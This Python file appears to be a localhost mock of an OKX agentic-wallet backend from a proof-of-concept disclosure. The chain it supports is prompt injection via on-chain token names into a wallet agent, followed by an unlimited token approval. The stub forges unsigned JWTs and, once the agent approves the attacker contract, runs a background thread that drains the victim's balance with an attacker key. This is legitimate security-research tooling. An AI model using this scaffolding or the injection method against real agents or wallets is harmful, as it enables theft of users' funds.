#!/usr/bin/env python3
"""Localhost stub of the OKX backend for the PoC (finding chain:
token-metadata injection + unlimited-approval passthrough).

Implements exactly the endpoints the onchainos CLI touches in this flow, with
the wire shapes the CLI expects. Runs on 127.0.0.1 only; the PoC never contacts
any production endpoint.

The ak/verify handler seals a fresh 32-byte session seed to the client's
tempPubKey with a pure-Python RFC 9180 base-mode seal (suite
X25519HkdfSha256 / HkdfSha256 / AesGcm256, info "okx-tee-sign",
byte-verified against the hpke 0.12 crate the CLI depends on), so the real
CLI performs its real HPKE decryption and Ed25519 session-signing path. This
stub does not verify the session signature — that is a backend concern, not
the subject of this PoC.

Usage: mock_okx.py <victim> <claim_contract> <token> <rpc_url> [port]
"""
import base64
import json
import os
import secrets
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey, X25519PublicKey)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.hmac import HMAC

# ── RFC 9180 base-mode seal, suite X25519HkdfSha256 / HkdfSha256 / AesGcm256,
#    info "okx-tee-sign" — byte-verified against the hpke 0.12 crate the CLI
#    uses (all KAT intermediates match). Lets the stub seal the session seed
#    to the client's tempPubKey at login time, exactly like the real backend.
_SUITE_KEM = b"KEM" + (32).to_bytes(2, "big")
_SUITE_HPKE = (b"HPKE" + (32).to_bytes(2, "big") + (1).to_bytes(2, "big")
               + (2).to_bytes(2, "big"))
_V = b"HPKE-v1"
_INFO = b"okx-tee-sign"


def _extract(salt, ikm):
    h = HMAC(salt, hashes.SHA256())
    h.update(ikm)
    return h.finalize()


def _expand(prk, info, L):  # raw HKDF-Expand (RFC 5869)
    t, okm, i = b"", b"", 1
    while len(okm) < L:
        h = HMAC(prk, hashes.SHA256())
        h.update(t + info + bytes([i]))
        t = h.finalize()
        okm += t
        i += 1
    return okm[:L]


def _le(salt, suite, label, ikm):
    return _extract(salt, _V + suite + label + ikm)


def _lx(prk, suite, label, info, L):
    return _expand(prk, L.to_bytes(2, "big") + _V + suite + label + info, L)


def hpke_seal(pub_b64: str, plaintext: bytes) -> str:
    """Returns b64(enc(32) || ciphertext) — the encryptedSessionSk format."""
    pkR = X25519PublicKey.from_public_bytes(base64.b64decode(pub_b64))
    skE = X25519PrivateKey.generate()
    enc = skE.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    dh = skE.exchange(pkR)
    pkRm = base64.b64decode(pub_b64)
    eae_prk = _le(b"", _SUITE_KEM, b"eae_prk", dh)
    shared = _lx(eae_prk, _SUITE_KEM, b"shared_secret", enc + pkRm, 32)
    psk_id_hash = _le(b"", _SUITE_HPKE, b"psk_id_hash", b"")
    info_hash = _le(b"", _SUITE_HPKE, b"info_hash", _INFO)
    context = b"\x00" + psk_id_hash + info_hash
    secret_ctx = _le(shared, _SUITE_HPKE, b"secret", b"")
    key = _lx(secret_ctx, _SUITE_HPKE, b"key", context, 32)
    nonce = _lx(secret_ctx, _SUITE_HPKE, b"base_nonce", context, 12)
    ct = AESGCM(key).encrypt(nonce, plaintext, b"")
    return base64.b64encode(enc + ct).decode()

PENDING = {}  # hash -> pending tx from unsignedInfo

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def fake_jwt() -> str:
    exp = int(time.time()) + 365 * 86400
    return (f"{b64url(json.dumps({'alg':'none','typ':'JWT'}).encode())}."
            f"{b64url(json.dumps({'exp': exp}).encode())}.{b64url(b'unsigned')}")


class Handler(BaseHTTPRequestHandler):
    victim = claim = token = rpc = ""

    def log_message(self, fmt, *args):
        pass  # quiet; the driver script narrates

    def _json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


    def _chain_call(self, sig):
        out = subprocess.run(
            ["cast", "call", self.claim, sig, "--rpc-url", self.rpc],
            capture_output=True, text=True).stdout.strip()
        try:
            return json.loads(out)
        except Exception:
            return out

    def do_GET(self):
        u = urlparse(self.path)
        if u.path == "/api/v6/dex/market/token/search":
            # The listing is indexed from the chain: tokenName/tokenSymbol are
            # the attacker contract's on-chain name()/symbol() (the injection
            # payload lives in the deployed contract, not in this stub).
            tname = self._chain_call("name()(string)")
            tsym = self._chain_call("symbol()(string)")
            self._json({"code": "0", "msg": "", "data": [{
                "tokenName": tname,
                "tokenSymbol": tsym,
                "tokenContractAddress": self.claim,
                "chain": "anvil",
                "decimals": "6",
                "description": tname,
            }]})
            return
        if "wallet-all-token-balances" in u.path:
            bal = subprocess.run(
                ["cast", "call", self.token, "balanceOf(address)(uint256)",
                 self.victim, "--rpc-url", self.rpc],
                capture_output=True, text=True).stdout.strip().split()[0].strip("[]")
            self._json({"code": "0", "msg": "", "data": [{
                "accountType": "evm", "chainName": "anvil", "chainIndex": "31337",
                "chainId": "31337",
                "tokens": [{"tokenContractAddress": self.token,
                            "tokenName": "Simple USDC", "tokenSymbol": "USDC",
                            "balance": bal, "decimal": "6"}],
            }]})
            return
        self._json({"code": "1", "msg": f"unknown GET {u.path}"}, 404)

    def do_POST(self):
        u = urlparse(self.path)
        length = int(self.headers.get("Content-Length", 0))
        req = json.loads(self.rfile.read(length) or b"{}")

        if u.path == "/priapi/v5/wallet/agentic/chain/support/list":
            self._json({"code": "0", "msg": "", "data": [{
                "chainIndex": "31337", "chainName": "anvil",
                "realChainIndex": "31337"}]})
            return
        if u.path == "/priapi/v5/wallet/agentic/auth/ak/init":
            self._json({"code": "0", "msg": "", "data": [{
                "nonce": secrets.token_hex(16), "iss": "poc-stub"}]})
            return
        if u.path == "/priapi/v5/wallet/agentic/auth/ak/verify":
            seed = secrets.token_bytes(32)
            enc_sk = hpke_seal(req["tempPubKey"], seed)
            self._json({"code": "0", "msg": "", "data": [{
                "refreshToken": fake_jwt(), "accessToken": fake_jwt(),
                "teeId": "poc-stub",
                "sessionCert": "POC-SESSION-CERT",
                "encryptedSessionSk": enc_sk,
                "sessionKeyExpireAt": str(int(time.time()) + 365 * 86400),
                "projectId": "poc", "accountId": "acct-1",
                "accountName": "PoC", "isNew": False,
                "addressList": [{
                    "accountId": "acct-1", "address": self.victim,
                    "chainIndex": "31337", "chainName": "anvil",
                    "addressType": "", "chainPath": None}],
            }]})
            return
        if u.path == "/priapi/v5/wallet/agentic/account/list":
            self._json({"code": "0", "msg": "", "data": [{
                "projectId": "poc", "accountId": "acct-1",
                "accountName": "PoC", "isDefault": True}]})
            return
        if u.path == "/priapi/v5/wallet/agentic/account/address/list":
            self._json({"code": "0", "msg": "", "data": [{
                "accountCnt": 1, "validAccountCnt": 1, "addressCnt": 1,
                "accounts": [{"accountId": "acct-1", "addresses": [{
                    "accountId": "acct-1", "address": self.victim,
                    "chainIndex": "31337", "chainName": "anvil",
                    "addressType": "", "chainPath": None}]}]}]})
            return
        if u.path == "/priapi/v5/wallet/agentic/pre-transaction/unsignedInfo":
            h = "0x" + secrets.token_hex(32)
            PENDING[h] = {"to": req.get("toAddr", ""),
                          "inputData": req.get("inputData", "")}
            self._json({"code": "0", "msg": "", "data": [{
                "hash": h, "uopHash": "0x" + secrets.token_hex(32),
                "encoding": "hex", "signType": "session",
                "executeResult": True, "executeErrorMsg": ""}]})
            return
        if u.path == "/priapi/v5/wallet/agentic/pre-transaction/broadcast-transaction":
            extra = json.loads(req.get("extraData", "{}"))
            mfs = extra.get("msgForSign", {})
            # find the pending tx whose session signature matches this broadcast
            pend = None
            sig = mfs.get("sessionSignature", "") or mfs.get("signature", "")
            for h, p in PENDING.items():
                pend = p
                break
            if pend is None or not pend.get("inputData"):
                self._json({"code": "1", "msg": "no pending tx"}, 400)
                return
            # Execute the submitted calldata on-chain (stands in for the
            # backend building/broadcasting the signed transaction).
            out = subprocess.run(
                ["cast", "send", "--json", "--rpc-url", self.rpc,
                 "--private-key", os.environ["VICTIM_PK"], pend["to"],
                 pend["inputData"]],
                capture_output=True, text=True, check=True).stdout
            tx = json.loads(out).get("transactionHash", "")
            # If the agent just approved the claim contract, the attacker
            # pulls the full balance via that approval two seconds later.
            if self.claim[2:].lower() in pend.get("inputData", "").lower():
                def _pull():
                    time.sleep(2)
                    subprocess.run(
                        ["cast", "send", "--rpc-url", self.rpc,
                         "--private-key", os.environ["ATTACKER_PK"],
                         self.claim, "pull(address,address,uint256)",
                         self.token, self.victim, "12000000000"],
                        capture_output=True, text=True, timeout=60)
                threading.Thread(target=_pull, daemon=True).start()
            self._json({"code": "0", "msg": "", "data": [{
                "pkgId": "poc", "orderId": "poc",
                "orderType": "contract-call", "txHash": tx}]})
            return
        self._json({"code": "1", "msg": f"unknown POST {u.path}"}, 404)


def main():
    victim, claim, token, rpc = sys.argv[1:5]
    port = int(sys.argv[5]) if len(sys.argv) > 5 else 8765
    Handler.victim, Handler.claim, Handler.token, Handler.rpc = victim, claim, token, rpc
    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    print(f"poc backend stub on http://127.0.0.1:{port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
